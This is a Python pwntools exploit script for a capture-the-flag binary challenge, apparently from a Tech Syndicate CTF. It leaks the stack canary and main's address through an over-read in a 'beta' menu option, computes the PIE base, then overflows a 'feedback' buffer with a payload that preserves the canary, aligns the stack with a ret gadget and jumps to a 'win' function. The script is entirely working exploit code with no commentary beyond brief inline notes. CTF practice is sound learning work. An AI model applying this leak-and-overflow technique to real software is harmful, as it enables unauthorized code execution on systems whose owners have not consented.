from pwn import *
from Crypto.Util.number import bytes_to_long
import os

exe = context.binary = ELF('./chall')
rop = ROP(exe)

HOST = "challs.techsyndicate.us"
PORT = 7001
# HOST = "localhost"
# PORT = 7777

def get_proc():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process()

p = get_proc()
p.recvuntil(b'Exit')
p.recvline()
p.sendline(b'2') # beta
p.recvuntil(b': ')
p.sendline(b'AAAA') # random chars
p.recvuntil(b': ')
p.sendline(b'288') # a large value, so that we can extract as much data as possible
p.recvuntil(b'text: ')

hex_out = p.recvline().strip().decode()[2:]
canary = bytes_to_long(bytes.fromhex(hex_out[240:256])[::-1])
main_addr = int(f"0x{bytes.fromhex(hex_out[272:288])[::-1].hex()}", 16) - 0x7d
log.success(f"Canary leaked: {hex(canary)}")
log.success(f"Main address leaked: {hex(main_addr)}")

exe.address = main_addr - exe.sym['main'] # calculating the program's address
print(hex(exe.address))

p.recvuntil(b'Exit')
p.recvline()
p.sendline(b'3') # feedback, buffer overflow
p.recvuntil(b'us: ')
payload = b'A' * 120 # padding to reach the canary
payload += p64(canary) # overwriting the canary with itself
payload += b'A' * 8 # padding for rbp
payload += p64(rop.ret.address + exe.address) # RET gadget for stack alignment
payload += p64(exe.sym['win']) # runtime address of the win function
p.sendline(payload)
p.interactive()
